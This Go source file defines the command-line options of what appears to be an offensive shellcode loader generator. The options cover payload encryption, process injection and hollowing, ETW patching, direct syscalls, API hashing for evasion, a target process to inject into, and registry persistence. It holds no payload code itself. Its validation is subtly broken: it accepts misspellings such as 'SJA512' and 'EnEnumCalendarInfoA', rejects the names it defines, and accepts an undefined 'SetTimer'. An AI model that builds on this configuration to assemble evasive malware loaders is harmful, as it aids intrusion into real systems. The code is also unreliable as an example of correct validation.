package cli

import "errors"

// encryption kind (used for CLI)
type encKind string

// shellcode-loading technique kind (used for CLI)
type technique string

// API-hash method
type apiHashTechnique string

const (
	DJB2   apiHashTechnique = "DJB2"
	SHA1   apiHashTechnique = "SHA1"
	SHA256 apiHashTechnique = "SHA256"
	SHA512 apiHashTechnique = "SHA512"

	EncKindAES encKind = "AES"
	EncKindXOR encKind = "XOR"
	EncKindBLF encKind = "blowfish"
	EncKindC20 encKind = "chacha20"

	CRT               technique = "CRT"
	CRTx              technique = "CRTx"
	ETWP              technique = "Etwp"
	SYSCALL           technique = "Syscall"
	SYSCALLTEST       technique = "SyscallTest"
	NtCreateThreadEx  technique = "NtCreateThreadEx"
	CreateFiber       technique = "CreateFiber"
	CreateThread      technique = "CreateThread"
	ProcessHollowing  technique = "ProcessHollowing"
	EnumCalendarInfoA technique = "EnumCalendarInfoA"
)

// String is used both by fmt.Print and by Cobra in help text
func (e *apiHashTechnique) String() string {
	return string(*e)
}

// Set must have pointer receiver so it doesn't change the value of a copy
func (e *apiHashTechnique) Set(v string) error {
	switch v {
	case "DJB2", "SHA1", "SHA256", "SJA512":
		*e = apiHashTechnique(v)
		return nil
	default:
		return errors.New("must be one of \"DJB2\", \"SHA1\", \"SHA256\" or \"SHA512\"\n\n")
	}
}

// Type is only used in help text
func (e *apiHashTechnique) Type() string {
	return "API Hash technique"
}

// String is used both by fmt.Print and by Cobra in help text
func (e *encKind) String() string {
	return string(*e)
}

// Set must have pointer receiver so it doesn't change the value of a copy
func (e *encKind) Set(v string) error {
	switch v {
	case "AES", "XOR", "blowfish", "chacha20":
		*e = encKind(v)
		return nil
	default:
		return errors.New("must be one of \"chacha20\", \"AES\", \"blowfish\" or \"XOR\"\n\n")
	}
}

// Type is only used in help text
func (e *encKind) Type() string {
	return "encKind"
}

// String is used both by fmt.Print and by Cobra in help text
func (e *technique) String() string {
	return string(*e)
}

// Set must have pointer receiver so it doesn't change the value of a copy
func (e *technique) Set(v string) error {
	switch v {
	case "CreateThread", "CRT", "ProcessHollowing", "Syscall", "CreateFiber", "CRTx", "Etwp", "NtCreateThreadEx", "EnEnumCalendarInfoA", "SetTimer":
		*e = technique(v)
		return nil
	default:
		return errors.New("must be one of \"CRT\", \"CRTx\", \"Syscall\", \"CreateFiber\", \"NTCreateThreadEx\",  \"EnumCalendarInfoA\", \"Etwp\", \"SetTimer\", \"ProcessHollowing\" or \"CreateThread\"\n\n")
	}
}

// Type is only used in help text
func (e *technique) Type() string {
	return "technique"
}

type Options struct {

	// Shellcode encryption method
	Encryption encKind

	// Encryption key (if needed)
	Key string

	// Shellcode path
	ShellcodePath string

	// OutName path
	OutName string

	// os compilation target
	OS string

	// Arch compilation target
	Arch string

	// target process name to inject
	Target string

	// Shellcode loading method
	Technique string

	// Sleep time before running execution
	SleepTime uint

	// Registry-Persistence handler
	Persistence string

	// Goversion filepath
	VersionFilePath string

	// PE filepath
	PEFilePath string

	// Builds with debug symbol
	WithDebug bool

	// Use API-hashing
	UseAPIHashing bool

	// API hashing algorithm
	APIHashingType string

	// Build type
	BuildType string
}
